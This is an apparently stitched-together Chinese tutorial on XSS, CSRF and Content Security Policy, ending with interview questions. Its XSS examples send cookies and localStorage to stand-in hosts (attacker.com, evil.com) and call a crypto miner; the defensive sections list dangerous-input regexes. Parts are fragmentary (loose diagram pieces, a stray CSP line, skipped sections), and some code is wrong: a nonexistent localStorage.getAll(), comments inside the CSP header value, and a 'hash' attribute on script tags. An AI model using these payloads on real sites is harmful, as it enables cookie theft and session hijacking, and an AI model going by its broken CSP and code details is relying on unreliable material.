## 二、XSS攻击深度解析

### 2.1 三种XSS类型

#### 类型一：存储型XSS

**攻击原理**：
攻击者将恶意脚本永久存储在目标服务器，其他用户访问时脚本自动执行。

```
攻击流程图：
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  攻击者提交  │ → │  服务器存储  │ → │  用户访问   │
│  恶意脚本    │    │  未过滤     │    │  脚本执行   │
└─────────────┘    └─────────────┘    └─────────────┘
                                              ↓
                                    ┌─────────────┐
                                    │  Cookie被盗  │
                                    │  会话劫持    │
                                    └─────────────┘
```

**实战示例**：

```javascript
// 攻击场景：评论区未过滤的输入

// 攻击者提交的内容
const maliciousComment = `
  <div class="comment">
    <p>这个产品真的很不错！</p>
    <img src="x" onerror="
      // 窃取Cookie
      fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
    ">
  </div>
`;

// 未防护的服务端代码
app.post('/comments', (req, res) => {
  const comment = req.body.comment;
  // 直接存储，未过滤
  db.query('INSERT INTO comments VALUES (?)', [comment]);
  // 或：未防护的前端渲染
  // commentsContainer.innerHTML = comment;
});

// 用户访问页面
// 恶意脚本自动执行，Cookie被发送到攻击者服务器
```

**攻击场景分析**：

```javascript
// 场景1：用户头像上传
const avatarUrl = `
  " onerror="fetch('https://evil.com/get?data=' + localStorage.getAll())
" x="
`;

// 场景2：搜索功能
// URL: /search?q=<script>alert(document.cookie)</script>
// 未过滤直接显示在页面

// 场景3：个人简介
const bio = `
  <p>很高兴认识大家！</p>
  <script>
    // 挖掘门罗币
    miner.start();
  </script>
`;
```

#### 类型二：反射型XSS

**攻击原理**：
恶意脚本作为用户输入被服务器反射回响应，URL参数中的脚本被执行。

```
攻击流程图：
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  攻击者构造  │ → │  用户点击   │ → │  服务器反射  │
│  恶意URL     │    │  恶意链接   │    │  脚本执行   │
└─────────────┘    └─────────────┘    └─────────────┘
```

**实战示例**：

```javascript
// 服务端代码（Node.js + Express）
app.get('/search', (req, res) => {
  const query = req.query.q;
  // 直接将用户输入插入HTML
  res.send(`
    <html>
      <body>
        <h1>搜索结果: ${query}</h1>
        <!-- 用户输入未经过滤 -->
      </body>
    </html>
  `);
});

// 恶意URL构造
// https://example.com/search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>

// 攻击者可能通过以下方式诱导用户点击：
// 1. 短链接服务
// 2. 钓鱼邮件
// 3. 社交工程
```

### 2.3 XSS防御策略

#### 策略一：输入验证

```javascript
// 白名单验证函数
function validateInput(input, rules) {
  const {
    maxLength = 1000,
    allowedTags = [],
    allowedAttrs = [],
    pattern = null
  } = rules;

  // 长度检查
  if (input.length > maxLength) {
    return { valid: false, error: '输入过长' };
  }

  // 模式匹配
  if (pattern && !pattern.test(input)) {
    return { valid: false, error: '格式不正确' };
  }

  // 危险模式检测
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+=/i,
    /<iframe/i,
    /data:/i
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(input)) {
      return { valid: false, error: '包含危险内容' };
    }
  }

  return { valid: true, value: input };
}

// 使用示例
const result = validateInput(userInput, {
  maxLength: 500,
  pattern: /^[\u4e00-\u9fa5a-zA-Z0-9\s,.!?]+$/
});
```

#### 策略二：输出编码

```javascript
// 多上下文编码函数
const HtmlEncoder = {
  // HTML上下文编码
  encodeForHTML(str) {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  },

  // JavaScript上下文编码
  encodeForJavaScript(str) {
    return str
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/</g, '\\x3C')
      .replace(/>/g, '\\x3E')
      .replace(/[\u0000-\u001F]/g, (c) => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'));
  },

  // URL上下文编码
  encodeForURL(str) {
    return encodeURIComponent(str)
      .replace(/!/g, '%21')
      .replace(/'/g, '%27')
      .replace(/\(/g, '%28')
      .replace(/\)/g, '%29')
      .replace(/~/g, '%7E');
  },

  // CSS上下文编码
  encodeForCSS(str) {
    return str.replace(/[^a-zA-Z0-9]/g, (c) => {
      const code = c.charCodeAt(0).toString(16).padStart(2, '0');
      return '\\' + code;
    });
  }
};

// 使用示例
// 安全的HTML渲染
element.textContent = userInput;
// 或
element.innerText = userInput;

// 需要HTML时使用编码
safeDiv.innerHTML = HtmlEncoder.encodeForHTML(userInput);
```

```
│  正常流程                                                  │
│  ┌─────────┐      ┌─────────┐      ┌─────────┐          │

┌─────────────────────────────────────────────────────────────┐
│  CSRF攻击流程                                              │
│                                                              │

│                                                              │
│  2. 用户被诱骗访问恶意网站B                                │
│     ┌─────────┐                                            │
│     │  网站B   │ ← 隐藏的表单                              │

│     POST https://网站A.com/transfer                         │

│  4. 网站A验证Cookie，执行操作                              │
│     ┌─────────┐                                            │
│     │  网站A   │ ← 误认为是合法请求                        │
```


### 3.3 CSRF防御策略

#### 策略一：CSRF Token

```javascript
// 服务端生成Token
const crypto = require('crypto');

// 生成安全的Token
function generateCsrfToken(session) {
  const token = crypto.randomBytes(32).toString('hex');
  session.csrfToken = token;
  session.csrfTokenExpiry = Date.now() + 3600000; // 1小时过期
  return token;
}

// 验证Token
function validateCsrfToken(req, res, next) {
  const cookieToken = req.cookies?.csrfToken;
  const bodyToken = req.body?._csrf;
  const headerToken = req.headers['x-csrf-token'];

  const token = bodyToken || headerToken;

  if (!token || !cookieToken) {
    return res.status(403).json({ error: 'CSRF token missing' });
  }

  if (token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  if (Date.now() > req.session.csrfTokenExpiry) {
    return res.status(403).json({ error: 'CSRF token expired' });
  }

  // 验证来源
  const origin = req.headers.origin;
  const allowedOrigins = ['https://example.com', 'https://www.example.com'];
  if (!allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }

  next();
}

// Express中间件使用
app.use('/api', validateCsrfToken);
```

```html
<!-- 前端表单包含Token -->
<form action="/api/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input type="text" name="amount">
  <button type="submit">转账</button>
</form>

<!-- Ajax请求携带Token -->
<script>
async function transfer(amount) {
  const response = await fetch('/api/transfer', {
    method: 'POST',
    credentials: 'include',  // 包含Cookie
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCsrfToken()  // 从Cookie读取
    },
    body: JSON.stringify({ amount })
  });
  return response.json();
}

// 从Cookie读取CSRF Token
function getCsrfToken() {
  const match = document.cookie.match(/csrfToken=([^;]+)/);
  return match ? match[1] : '';
}
</script>
```

## 四、内容安全策略（CSP）

### 4.1 CSP配置详解

```nginx
# Nginx配置CSP
add_header Content-Security-Policy "
  # 默认资源策略
  default-src 'self';

  # 脚本策略（最重要）
  script-src 'self' 'nonce-{NONCE}' https://trusted-cdn.com;

  # 样式策略
  style-src 'self' 'nonce-{NONCE}' https://fonts.googleapis.com;

  # 图片策略
  img-src 'self' data: https: blob:;

  # 字体策略
  font-src 'self' https://fonts.gstatic.com;

  # 连接策略
  connect-src 'self' https://api.example.com wss://socket.example.com;

  # 媒体策略
  media-src 'self' https://media.example.com;

  # iframe策略
  frame-src 'none';

  # 对象策略
  object-src 'none';

  # 禁止内联脚本执行（需要nonce）
  # 'unsafe-inline'已被废弃
  # 'unsafe-eval'危险，禁止使用

  # 禁止加载混合内容
  block-all-mixed-content;

  # 升级不安全请求
  upgrade-insecure-requests;
" always;
```

```javascript
    "font-src 'self' https://fonts.gstatic.com",
```

## 七、面试核心问题

### 问题一：XSS和CSRF的区别？

**参考答案**：

| 维度 | XSS | CSRF |
|------|-----|------|
| **攻击原理** | 在页面中注入恶意脚本 | 伪造用户请求 |
| **攻击目标** | 用户浏览器 | 服务器 |
| **利用方式** | 利用信任关系执行脚本 | 利用Cookie自动携带 |
| **防护重点** | 输入过滤、输出编码 | Token验证、请求来源验证 |
| **Cookie** | 窃取Cookie | 利用Cookie |

### 问题二：如何防止存储型XSS？

**参考答案**：

1. **输入验证**：白名单过滤特殊字符
2. **输出编码**：根据输出上下文适当编码
3. **内容安全策略**：限制脚本执行
4. **HTTP-only Cookie**：防止Cookie被JavaScript读取
5. **定期安全审计**

### 问题三：CSP的nonce和hash模式区别？

**参考答案**：

**nonce模式**：
```html
<!-- 服务器为每个请求生成唯一nonce -->
<script nonce="abc123xyz">
  // 只有带有匹配nonce的脚本执行
</script>
```

**hash模式**：
```html
<!-- 预计算脚本内容的hash值 -->
<script hash="sha256-xxxxx">
  // hash匹配的脚本执行
</script>
```

**区别**：
- nonce：每个请求变化，需要服务端配合
- hash：静态脚本，适合CDN缓存
